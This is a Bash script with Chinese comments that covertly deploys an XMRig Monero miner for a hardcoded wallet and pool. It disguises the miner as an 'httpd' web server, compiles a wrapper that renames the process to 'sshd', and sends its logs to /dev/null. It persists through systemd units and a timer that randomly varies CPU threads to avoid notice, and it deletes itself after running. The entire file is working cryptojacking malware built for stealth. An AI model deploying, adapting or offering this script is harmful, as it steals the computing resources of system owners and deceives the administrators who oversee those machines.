#!/bin/bash

# 隐藏挖矿进程及其特征的一键部署脚本（带随机线程调整）

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池信息
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录，使用伪装名称 "webserver"
mkdir -p /opt/webserver /etc/systemd/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装，下载后立即重命名
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/webserver || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/webserver/xmrig-6.22.2/xmrig /opt/webserver/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/webserver/httpd
rm -rf /opt/webserver/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/webserver/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "sshd", 0, 0, 0);
    execv("/opt/webserver/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/webserver/wrapper /opt/webserver/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/webserver/wrapper.c

# 生成配置文件
cat > /etc/systemd/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "threads": 3
}
EOF

# 创建线程管理脚本（随机调整）
cat > /opt/webserver/adjust_threads.sh <<'EOF'
#!/bin/bash
# 随机调整线程数量，最低3个线程
MIN_THREADS=3
MAX_THREADS=$(nproc)  # 获取CPU核心数

# 生成随机线程数，在MIN_THREADS和MAX_THREADS之间
NEW_THREADS=$((MIN_THREADS + RANDOM % (MAX_THREADS - MIN_THREADS + 1)))

# 更新配置文件，使用临时文件以确保原子性
TEMP_FILE=$(mktemp)
sed "s/\"threads\": [0-9]*/\"threads\": $NEW_THREADS/" /etc/systemd/conf.d/httpd.conf > "$TEMP_FILE"
mv "$TEMP_FILE" /etc/systemd/conf.d/httpd.conf

# 重启服务以应用新配置
systemctl restart httpd.service
EOF

chmod +x /opt/webserver/adjust_threads.sh

# 创建用户和组（如果已存在则跳过）
groupadd -r httpd 2>/dev/null || echo "组 'httpd' 已存在，继续执行"
if id "httpd" &>/dev/null; then
    echo "用户 'httpd' 已存在，将使用现有用户继续执行"
else
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户失败" 1>&2; exit 1; }
fi

# 创建主服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/webserver/wrapper --config=/etc/systemd/conf.d/httpd.conf --no-color --log-file=/dev/null
Restart=always
Type=simple

[Install]
WantedBy=multi-user.target
EOF

# 创建定时器来定期调整线程（使用oneshot服务）
cat > /etc/systemd/system/httpd-adjust.service <<EOF
[Unit]
Description=HTTP Server Thread Adjuster
Requires=httpd.service
After=httpd.service

[Service]
Type=oneshot
ExecStart=/opt/webserver/adjust_threads.sh
User=root
RemainAfterExit=no
EOF

cat > /etc/systemd/system/httpd-adjust.timer <<EOF
[Unit]
Description=Run thread adjuster every 5 minutes

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
Unit=httpd-adjust.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 设置文件权限
chown root:root /etc/systemd/conf.d/httpd.conf /opt/webserver/adjust_threads.sh
chmod 600 /etc/systemd/conf.d/httpd.conf
chmod 700 /opt/webserver/adjust_threads.sh

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service httpd-adjust.timer
systemctl start httpd.service httpd-adjust.timer || { echo "服务启动失败" 1>&2; exit 1; }

# 删除脚本自身
rm -- "$0"
echo "部署完成！线程将每5分钟随机调整，最低3个线程"
